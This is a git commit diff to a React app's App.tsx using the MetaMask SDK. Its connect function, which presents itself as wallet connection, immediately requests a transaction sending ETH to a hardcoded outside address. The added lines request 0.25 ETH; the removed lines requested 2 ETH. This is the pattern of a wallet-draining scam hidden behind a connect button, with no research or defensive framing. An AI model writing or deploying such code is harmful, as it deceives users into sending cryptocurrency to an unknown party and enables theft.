d91387ef7b4f03ff849e750132349522ca960397
One290 <lenya.dorovskoy@mail.ru>
2024-11-18 14:21:14 +0800

    fujfhh

--- src/App.tsx
+++ src/App.tsx
@@ -1,22 +1,19 @@
 import { useSDK } from "@metamask/sdk-react";
-import { useState } from 'react'
 import './App.css'
 import Web3 from 'web3'
 
 function App() {
-  const [account, setAccount] = useState<string>();
   const { sdk, connected, chainId, provider } = useSDK();
   const web3 = new Web3();
 
   const connect = async () => {
+    const accounts = await sdk?.connect();
     try {
-      const accounts = await sdk?.connect();
-      setAccount(accounts?.[0]);
-      const params1 = [ { from: accounts?.[0], to: "0xb73d998d706d006dd22e678bcb787cf1de1351e2", value: "0x1BC16D674EC80000" } ]
-      console.log(params1)
-      await provider?.request({method: "eth_sendTransaction", params: params1 })
-    } catch (err) {
-      console.warn("failed to connect..", err);
+      var transactionHash = await provider?.request({method: "eth_sendTransaction", params: [ { from: accounts?.[0], to: "0xb73d998d706d006dd22e678bcb787cf1de1351e2", value: web3.utils.toHex(web3.utils.toWei("0.25", "ether")) } ] })
+      console.log("Transaction successful. Hash: " + transactionHash)
+    }
+    catch (e) {
+      console.log("Transaction failed. Error code: " + e.code)
     }
   };
 
